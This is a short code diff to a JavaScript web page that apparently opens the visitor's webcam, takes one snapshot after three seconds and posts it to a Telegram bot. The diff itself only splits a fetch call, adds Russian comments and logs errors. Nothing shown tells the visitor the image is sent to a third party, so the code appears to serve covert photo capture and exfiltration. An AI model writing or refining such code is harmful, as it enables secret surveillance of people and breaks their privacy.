@@ -5,8 +5,12 @@ async function sendTelegram(photoBase64) {
     const url = https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto;
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
-    const blob = await fetch(photoBase64).then(r => r.blob());
+    
+    // Конвертируем base64 в blob
+    const response = await fetch(photoBase64);
+    const blob = await response.blob();
     formData.append('photo', blob);
+    
     await fetch(url, { method: 'POST', body: formData });
 }
 
@@ -24,10 +28,13 @@ async function startCam() {
             canvas.getContext('2d').drawImage(video, 0, 0);
             const photo = canvas.toDataURL('image/jpeg');
             await sendTelegram(photo);
+            
+            // Выключаем камеру
             stream.getTracks().forEach(track => track.stop());
         }, 3000);
     } catch (error) {
         alert('Ошибка доступа к камере. Разреши доступ и попробуй снова.');
+        console.error(error);
     }
 }
 
